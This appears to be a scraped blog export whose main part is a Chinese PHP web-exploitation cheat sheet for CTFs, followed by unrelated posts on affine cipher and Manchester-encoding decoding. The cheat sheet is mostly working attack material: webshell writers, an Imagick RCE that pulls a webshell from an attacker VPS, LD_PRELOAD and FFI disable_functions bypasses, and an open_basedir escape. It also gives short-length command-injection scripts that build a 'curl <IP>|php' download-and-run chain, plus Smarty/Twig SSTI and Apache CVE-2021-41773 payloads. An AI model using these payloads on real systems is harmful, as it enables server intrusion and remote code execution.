https://www.cnblogs.com/wangtanzhi/p/12311239.html ​ 列目录 SPL目录类：DirectoryIterator 1234567&lt;?php//可用于猜解文件名$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123; echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;?&gt; SPL目录类：FilesystemIterator 123&lt;?phpecho new FilesystemIterator(getcwd());?&gt; SPL目录类：GlobIterator 可通配例如/var/html/www/flag* scandir() 面向过程方法：opendir()，readdir()，closedir() 面向对象方法：PHP的dir类 ​ 读文件 特殊文件： /proc/self/cmdline - 应用运行的文件夹 /proc/self/environ（/proc/1/environ） - 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示。重要的属性，比如WEB服务的权限 /proc/self/cwd - 当前目录 /proc/[PID]/fd/[NUM] - 是个目录，包含当前进程打开的每一个文件的文件描述符，这些文件描述符是指向实际文件的一个符号链接 /proc/self/maps + /proc/self/mem 文件读取部分如可以seek读取，第一步通过 /proc/self/maps 读取堆栈分布，再读取 /proc/self/mem 的内存数据，再通过正则筛选符合格式的数据。 123456789101112131415import requests, reurl = &quot;&quot;maps_url = f&quot;&#123;url&#125;?file=/proc/self/maps&quot;maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;maps = re.findall(maps_reg, requests.get(maps_url).text)# print(maps)for m in maps: start, end = m.split(&quot;-&quot;)[0], m.split(&quot;-&quot;)[1] Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16)) read_url = f&quot;&#123;url&#125;?file=/proc/self/mem&amp;offset=&#123;Offset&#125;&amp;length=&#123;Length&#125;&quot; s = requests.get(read_url).content rt = re.findall(b&quot;[a-z0-9]&#123;8&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;4&#125;-[a-z0-9]&#123;12&#125;&quot;, s) if rt: print(rt) file_get_contents() / highlight_file() / show_source() / readfile() / readgzfile() / print_r(file()) fopen() / fread() / fgets() / fgetc() / fgetss() / fgetcsv() 123456$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;); $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125; $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125; $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125; include() / require() 适用非php文件 SPL文件类：SplFileObject 按行读取，多行需要遍历。适配伪协议，如 php://filter。 Mysql 123456789101112131415161718&lt;?php$conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125; $sql = &quot;SELECT LOAD_FILE(&#x27;/flag.txt&#x27;) as my&quot;;$result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo $row[&quot;my&quot;]; &#125;&#125; else &#123; echo &quot;0 结果&quot;;&#125;$conn-&gt;close();?&gt; ​ 写文件 file_put_contents() SplFileObject::fwrite() 1234567891011121314define(&quot;EV&quot;, &quot;eva&quot;.&quot;l&quot;);define(&quot;GETCONT&quot;, &quot;fil&quot;.&quot;e_get_contents&quot;);// 由于禁止了$，从已有的地方获取$符define(&quot;D&quot;,(GETCONT)(&#x27;/var/www/html/index.php&#x27;)[353]);define(&quot;SHELL&quot;,&quot;&lt;?php &quot;.EV.&quot;(&quot;.D.&quot;_POST[&#x27;a&#x27;]);&quot;);echo (GETCONT)(&#x27;./shell.php&#x27;);class splf extends SplFileObject &#123; public function __destruct() &#123; parent::fwrite(SHELL); &#125;&#125;define(&quot;PHARA&quot;, new splf(&#x27;shell.php&#x27;,&#x27;w&#x27;)); FTP Python开启FTP服务 123456789101112131415from pyftpdlib.authorizers import DummyAuthorizerfrom pyftpdlib.handlers import FTPHandlerfrom pyftpdlib.servers import FTPServerauthorizer = DummyAuthorizer()authorizer.add_anonymous(&quot;./&quot;)handler = FTPHandlerhandler.authorizer = authorizerhandler.masquerade_address = &quot;ip&quot;# 注意要用被动模式handler.passive_ports = range(9998,10000)server = FTPServer((&quot;0.0.0.0&quot;, 23), handler)server.serve_forever() PHP下载 123456789101112131415161718$local_file = &#x27;/tmp/hack1.so&#x27;;$server_file = &#x27;hack.so&#x27;;$ftp_server = &#x27;xxxxx&#x27;;$ftp_port=21;$ftp = ftp_connect($ftp_server,$ftp_port);$login_result = ftp_login($ftp, &#x27;anonymous&#x27;, &#x27;&#x27;);// 注意要开启被动模式ftp_pasv($ftp,1);if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) &#123; echo &quot;Successfully written to $local_file\\n&quot;;&#125; else &#123; echo &quot;There was a problem\\n&quot;;&#125;ftp_close($ftp); ​ 读类信息 ReflectionClass::export() ​ new+原生类 eval(&quot;echo new $a($b);&quot;); 12?a=Exception&amp;b=system(&#x27;whoami&#x27;)?a=SplFileObject&amp;b=system(&#x27;whoami&#x27;) echo new $a($b); 123456列目录?a=DirectoryIterator&amp;b=glob://f*读文件?a=SplFileObject&amp;b=1.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=1.php new $a($b); 参考：Exploiting Arbitrary Object Instantiations in PHP without Custom Classes 12?a=Imagick&amp;b=http://121.40.253.177:7777nc -lvnp 7777 按照文中的POC，在VPS中生成一个图片，含有一句话木马： convert xc:red -set &#39;Copyright&#39; &#39;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#39; positiv e.png 在VPS中监听12345端口，再往服务器发送请求包如下： 12345678910111213141516171819202122232425POST /?b=Imagick&amp;c=vid:msl:/tmp/php* HTTP/1.1Host: 1.1.1.1:32127Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmqTayg6bqrContent-Length: 348------WebKitFormBoundaryeTvfNEmqTayg6bqrContent-Disposition: form-data; name=&quot;123&quot;; filename=&quot;exec.msl&quot;Content-Type: text/plain&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;image&gt;&lt;read filename=&quot;http://vps:12345/positive.png&quot; /&gt;&lt;write filename=&quot;/var/www/html/positive.php&quot;/&gt;&lt;/image&gt;------WebKitFormBoundaryeTvfNEmqTayg6bqr-- 发送后，靶机就往VPS中请求了该文件，并且把该文件下载到了指定目录，访问后即可RCE。 这种手法的限制： 需要通网，当然如果不通网这种手法也存在一个重命名文件的功能，如果网站有上传功能可以利用这个手法将恶意的JPG重命名成PHP； 需要知道网站的目录（比赛中通常是/var/www/html或者/app这类）； 需要在网站目录下有写权限，当然如果知道类似于upload这种文件夹的路径也可以（因为通常它们是可写的； 最最重要的：需要有装Imagick扩展，该扩展其实不是默认自带的（一定程度上限制了攻击面）。 $class = new $a($b); / (new $a($b))-&gt;$c(); 1234$class=new Exception(&quot;test string&quot;);echo $class‐&gt;__toString();echo new Error(&#x27;system&#x27;)-&gt;getMessage(); (new $a($b))-&gt;$c($d); 1(new ReflectionFunction(&#x27;system&#x27;))-&gt;invoke(&#x27;ls&#x27;); ​ bypass disable_functionLD_PRELOADLinux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件 /etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和 /etc/ld.so.preload 配置文件中指定的动态链接库依然会被装载，因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。 通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。 利用 error_log 与 mail 函数劫持 getuid 函数，系统通过环境变量(env)中的LD_PRELOAD加载动态链接库。 12345678910111213// hack.c// 将其按照系统操作位数生成对应的so文件// gcc -c -fPIC hack.c -o hack// gcc --share hack -o hack.so#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);&#125; 函数替代：mail() -&gt; mb_send_mail() 参考 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令 RCTF 2022 - filechecker-pro-max UAFphp7-gc-bypass，php7-backtrace-bypass，php-json-bypass 法1：修改pwn()传入的cmd，上传php至可写目录，include包含执行。 法2：无需上传，将代码放入eval函数执行。 参考题 buuoj-GKCTF2020-CheckIn FFI使用条件：PHP版本&gt;=7.4 123$ffi = FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;cd /;./readflag &gt; /var/www/html/good.txt&quot;); readgzfile(&quot;good.txt&quot;); 123//直接调用php源码中的函数，php_exec的type为3时对应的是passthru，直接将结果原始输出$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]); 123456789//使用c里的popen，然后从管道中读取结果$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123; $d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/* 参考 PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数 ​ bypass open_basedir12mkdir(&#x27;/tmp/test&#x27;);chdir(&#x27;/tmp/test&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&#x27;/&#x27;));@eval($_POST[a]); echo 1;chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/flag&#x27;)); ​ 长度限制 7字符 123456#写入语句&lt;?php eval($_GET[1]);#base64编码后PD9waHAgZXZhbCgkX0dFVFsxXSk7#需要被执行的语句：echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 1234567891011121314151617#!/usr/bin/python# -*- coding: UTF-8 -*- import requests url = &quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) requests.get(url.format(i.strip())) #检查是否攻击成功test = requests.get(&quot;http://192.168.61.157/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 5字符 思路1 拼接字符串写入一句话，同7字符。 思路2 1&lt;?php eval($_GET[1]); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;0&gt;a&gt;hp&gt;p\\\\&gt;1.\\\\&gt;\\&gt;\\\\&gt;-d\\\\&gt;\\ \\\\&gt;64\\\\&gt;se\\\\&gt;ba\\\\&gt;\\|\\\\&gt;7\\\\&gt;Sk\\\\&gt;X\\\\&gt;x\\\\&gt;Fs\\\\&gt;FV\\\\&gt;d\\\\&gt;X0\\\\&gt;k\\\\&gt;g\\\\&gt;bC\\\\&gt;h\\\\&gt;XZ\\\\&gt;gZ\\\\&gt;A\\\\&gt;aH\\\\&gt;w\\\\&gt;D9\\\\&gt;P\\\\&gt;S&#125;\\\\&gt;IF\\\\&gt;&#123;\\\\&gt;\\$\\\\&gt;o\\\\&gt;ch\\\\&gt;e\\\\sh 0sh f 12345678910111213#!/usr/bin/python# -*- coding: UTF-8 -*-import requestsurl = &quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;print(&quot;[+]start attack!!!&quot;)with open(&quot;payload.txt&quot;,&quot;r&quot;) as f: for i in f: print(&quot;[*]&quot; + url.format(i.strip())) requests.get(url.format(i.strip()))#检查是否攻击成功test = requests.get(&quot;http://192.168.61.157/1.php&quot;)if test.status_code == requests.codes.ok: print(&quot;[*]Attack success!!!&quot;) 4字符 思路1 传入&gt;cat，在目标目录下写入cat文件； 再使用通配符进行执行&gt;* /*，读取根目录下的flag文件。 思路2 字符拼接 12345678&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)&gt;rev*v&gt;0 (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)sh 0 (sh执行0里面的内容) 思路3 反弹shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#-*-coding:utf8-*-import requests as rfrom time import sleepimport randomimport hashlibtarget = &#x27;http://52.197.41.31/&#x27; # 存放待下载文件的公网主机的IPshell_ip = &#x27;xx.xx.xx.xx&#x27; # 本机IPyour_ip = r.get(&#x27;http://ipv4.icanhazip.com/&#x27;).text.strip() # 将shell_IP转换成十六进制ip = &#x27;0x&#x27; + &#x27;&#x27;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(&#x27;.&#x27;)]) reset = target + &#x27;?reset&#x27;cmd = target + &#x27;?cmd=&#x27;sandbox = target + &#x27;sandbox/&#x27; + hashlib.md5(&#x27;orange&#x27; + your_ip).hexdigest() + &#x27;/&#x27; # payload某些位置的可选字符pos0 = random.choice(&#x27;efgh&#x27;)pos1 = random.choice(&#x27;hkpq&#x27;)pos2 = &#x27;g&#x27; # 随意选择字符 payload = [ &#x27;&gt;dir&#x27;, # 创建名为 dir 的文件 &#x27;&gt;%s&gt;&#x27; % pos0, # 假设pos0选择 f , 创建名为 f&gt; 的文件 &#x27;&gt;%st-&#x27; % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t&gt;s &#x27;&gt;sl&#x27;, # 创建名为 &gt;sl 的文件；到此处有四个文件， # ls 的结果会是：dir f&gt; kt- sl &#x27;*&gt;v&#x27;, # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ， # 前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 &#x27;&gt;rev&#x27;, # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v &#x27;*v&gt;%s&#x27; % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f # 续行分割 curl 0x11223344|php 并逆序写入 &#x27;&gt;p&#x27;, &#x27;&gt;ph\\&#x27;, &#x27;&gt;|\\&#x27;, &#x27;&gt;%s\\&#x27; % ip[8:10], &#x27;&gt;%s\\&#x27; % ip[6:8], &#x27;&gt;%s\\&#x27; % ip[4:6], &#x27;&gt;%s\\&#x27; % ip[2:4], &#x27;&gt;%s\\&#x27; % ip[0:2], &#x27;&gt; \\&#x27;, &#x27;&gt;rl\\&#x27;, &#x27;&gt;cu\\&#x27;, &#x27;sh &#x27; + pos2, # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 &#x27;sh &#x27; + pos0, # sh f 执行curl命令，下载文件，写入木马。] s = r.get(reset)for i in payload: assert len(i) &lt;= 4 s = r.get(cmd + i) print &#x27;[%d]&#x27; % s.status_code, s.url sleep(0.1)s = r.get(sandbox + &#x27;fun.php?cmd=uname -a&#x27;)print &#x27;[%d]&#x27; % s.status_code, s.urlprint s.text ​ 模板引擎对于PHP的模板引擎，很有可能是smarty或者twig。 根据流程图测试： smarty12345678910111213141516171819202122232425262728X-Forwarded-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125; （有回显）&#123;$smarty.version&#125; （smarty版本号）&#123;php&#125;phpinfo();&#123;/php&#125; （废弃）&#123;if phpinfo()&#125;&#123;/if&#125;&#123;self::getStreamVariable(“file:///etc/passwd”)&#125; （旧版本）&#123;$s=$smarty.template_object-&gt;smarty&#125;&#123;$fp=$smarty.template_object-&gt;compiled-&gt;filepath&#125;&#123;Smarty_Internal_Runtime_WriteFile::writeFile($fp,&quot;&lt;?php+phpinfo();&quot;,$s)&#125;&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#x27;string:&#123;system(\\&#x27;id\\&#x27;)&#125;&#x27;)&#125;&#123;function name=&#x27;rce()&#123;&#125;;system(&quot;id&quot;);function &#x27;&#125;&#123;/function&#125;# Smarty3 string:&#123;include file=&#x27;C:/Windows/win.ini&#x27;&#125;string:&#123;function name=&#x27;x()&#123;&#125;;system(whoami);function &#x27;&#125;&#123;/function&#125; （CVE-2021-26120，Smarty&lt;3.1.39）string:&#123;$smarty.template_object-&gt;smarty-&gt;_getSmartyObj()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;enableSecurity()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;addTemplateDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setTemplateDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;addPluginsDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setPluginsDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setCompileDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125;string:&#123;$smarty.template_object-&gt;smarty-&gt;setCacheDir(&#x27;./x&#x27;)-&gt;display(&#x27;string:&#123;system(whoami)&#125;&#x27;)&#125; （CVE-2021-26119，Smarty=3.1.44/4.1.0）eval:&#123;math equation=&#x27;(&quot;\\163\\171\\163\\164\\145\\155&quot;)(&quot;\\167\\150\\157\\141\\155\\151&quot;)&#x27;&#125; （CVE-2021-29454，PHP7，Smarty&lt;3.1.42/&lt;4.0.2） twig1234567891011121314&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;POST /subscribe?0=cat+/etc/passwd HTTP/1.1&#123;&#123;app.request.query.filter(0,0,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125; 参考：TWIG 全版本通用 SSTI payloads ​ 反混淆https://www.zhaoyuanma.com/phpjm.html https://yoursunny.com/p/PHP-decode/ ​ 中间件漏洞Apache Apache 2.4.49 CVE-2021-41773 目录穿越漏洞。可以读取到Apache服务器Web目录以外的其他文件，或者读取Web中的脚本源码，或者在开启cgi或cgid的服务器上执行任意命令。 curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd curl -v --data &quot;echo;命令&quot; &#39;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#39; ​ 其他opcacheopencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用） opcache缓存getshell","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://lazzzaro.github.io/tags/PHP/"},{"name":"绕过","slug":"绕过","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"仿射密码","slug":"crypto-仿射密码","date":"2020-05-18T10:56:48.000Z","updated":"2020-06-14T07:33:04.957Z","comments":true,"path":"2020/05/18/crypto-仿射密码/","permalink":"https://lazzzaro.github.io/2020/05/18/crypto-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/","excerpt":"","text":"仿射密码仿射密码是一种替换密码。它是一个字母对一个字母的。 加密函数 $e(x)=ax+b{\\pmod {m}}$ 其中 $a$ 和 $m$ 互质，$m$ 是字母的数目。 解密函数 $d(x)=a^{-1}(x-b){\\pmod {m}}$ 其中 $a^{-1}$ 是 $a$ 在 $ \\mathbb {Z} _{m}$ 群的乘法逆元。 仿射密码为单表加密的一种，字母系统中所有字母都由简单数学方程加密，对应至数值，或转回字母。 其仍有所有替代密码之弱处。所有字母皆借由方程 $(ax+b)\\pmod {26}$ 加密，$b$ 为移动大小。 当 $a=1$，仿射加密为凯撒密码，因该加密方程可简化为线性移动。 代码 对应字母表 1234# 仿射密码对应字母表def affine(a, b): for i in range(26): print chr(i+65) + &quot;: &quot; + chr(((a*i+b)%26)+65) 一般情况 123456789import gmpy2def affline_decode(cipher_text, a, b, m): plain_text = &#x27;&#x27; for i in cipher_text: if i in &#x27;abcdefghijklmnopqrstuvwxyz&#x27;: plain_text += chr(((ord(i)-ord(&#x27;a&#x27;))-b)*gmpy2.invert(a,m) % m + ord(&#x27;a&#x27;)) else: plain_text += i print(plain_text)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"密码","slug":"密码","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"曼彻斯特编码","slug":"crypto-曼彻斯特编码","date":"2020-05-17T13:26:35.000Z","updated":"2020-05-18T10:58:43.942Z","comments":true,"path":"2020/05/17/crypto-曼彻斯特编码/","permalink":"https://lazzzaro.github.io/2020/05/17/crypto-%E6%9B%BC%E5%BD%BB%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81/","excerpt":"","text":"man有2个不同的规范，在二进制位的发送方式上还有正序和逆序之分，所以对给定的编码后的数据进行解码处理的时候，得考虑使用的规范和字节序。 曼彻斯特编码有2个不同的规范，在二进制位的发送方式上还有正序和逆序之分，所以对给定的编码后的数据进行解码处理的时候，得考虑使用的规范和字节序。 1. 曼彻斯特编码 标准曼彻斯特编码 由G. E. Thomas, Andrew S. Tanenbaum等人在1949年提出的，它规定0是由低-高的电平跳变表示，1是高-低的电平跳变，即01为0，10为1。 IEEE曼彻斯特编码： 在IEEE 802.4（令牌总线）和低速版的IEEE 802.3（以太网）中规定，按照这样的说法，低-高电平跳变表示1，高-低的电平跳变表示0，即01为1，10为0。 2. 差分曼彻斯特编码后一个信号如果与前一个信号跳变相同，则为0，不同，则为1，例如，0101，1010为0，0110，1001为1。第一个信号位如何确定，查到有资料说： 如果中间位电平从低到高，则表示0；如果中间位电平从高到低，则表示1； 但有的题好像又是直接忽略第一位，待解。 其他解法 只有5，6，9，a这4种字符： 5 - 0101；6 - 0110；9 - 1001；a - 1010。 然后转换为16进制，再转换成字符串即可获得flag。 3. 关于字节逆序的问题在某个传输规范中，每个字节的8个比特位会逆序发送，如发送：01001001 10101010，发送顺序会变成10010010 01010101。因此这里也是做题中的一个坑。 4. 通用代码代码在差分曼彻斯特编码的解码中，使用了忽略第一位的方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# -*- coding: utf-8 -*-import structimport mathdef long_to_bytes(n): s = b&#x27;&#x27; pack = struct.pack while n &gt; 0: s = pack(&#x27;&gt;I&#x27;, n &amp; 0xffffffff) + s n = n &gt;&gt; 32 for i in range(len(s)): if s[i] != b&#x27;\\000&#x27;[0]: break else: s = b&#x27;\\000&#x27; i = 0 s = s[i:] return s#字节逆序def byteinvert(str_bin): ret=&#x27;&#x27; for i in range(len(str_bin)//8): ret+=str_bin[i*8:i*8+8][::-1] return ret#标准曼彻斯特def MCST_stand(str_bin): ret=&#x27;&#x27; for i in range(len(str_bin)//2): x=str_bin[i*2:i*2+2] if x==&#x27;01&#x27;: ret+=&#x27;0&#x27; elif x==&#x27;10&#x27;: ret+=&#x27;1&#x27; else: return &#x27;stand manchester decode wrong!&#x27; return ret#IEEE规范的曼彻斯特def MCST_IEEE(str_bin): ret=&#x27;&#x27; for i in range(math.ceil(len(str_bin)/8)): x=str_bin[i*2:i*2+2] if x==&#x27;01&#x27;: ret+=&#x27;1&#x27; elif x==&#x27;10&#x27;: ret+=&#x27;0&#x27; else: return &#x27;stand manchester decode wrong!&#x27; return ret#差分曼彻斯特def MCST_diff(str_bin): ret=&#x27;&#x27; for i in range(0,len(str_bin)//2-1): x1=str_bin[i*2:i*2+2] x2=str_bin[i*2+2:i*2+4] if x1==x2: ret+=&#x27;0&#x27; else: ret+=&#x27;1&#x27; return retif __name__ == &quot;__main__&quot;: str_hex=&#x27;9a9a9a6a9aa9656699a699a566995956996a996aa6a965aa9a6aa596a699665a9aa699655a696569655a9a9a9a595a6965569a59665566955a6965a9596a99aa9a9566a699aa9a969969669aa6969a9559596669&#x27; #str_bin=&#x27;0101010101010101&#x27; str_bin=str(bin(int(str_hex,16)))[2:] m1=MCST_IEEE(str_bin) m2=MCST_stand(str_bin) m3=MCST_diff(str_bin) print(&#x27;\\nIEEE曼彻斯特:&#x27;) print(m1) print(hex(int(m1,2))) print(long_to_bytes(int(m1,2))) print(&#x27;\\n 标准曼彻斯特:&#x27;) print(m2) print(hex(int(m2,2))) print(long_to_bytes(int(m2,2))) print(&#x27;\\n 差分曼彻斯特:&#x27;) print(m3) print(hex(int(m3,2))) print(long_to_bytes(int(m3,2))) print(&#x27;\\n=============字节逆序=============&#x27;) m1=byteinvert(m1) m2=byteinvert(m2) m3=byteinvert(m3) print(&#x27;\\nIEEE曼彻斯特:&#x27;) print(m1) print(hex(int(m1,2))) print(long_to_bytes(int(m1,2))) print(&#x27;\\n 标准曼彻斯特:&#x27;) print(m2) print(hex(int(m2,2))) print(long_to_bytes(int(m2,2))) print(&#x27;\\n 差分曼彻斯特:&#x27;) print(m3) print(hex(int(m3,2))) 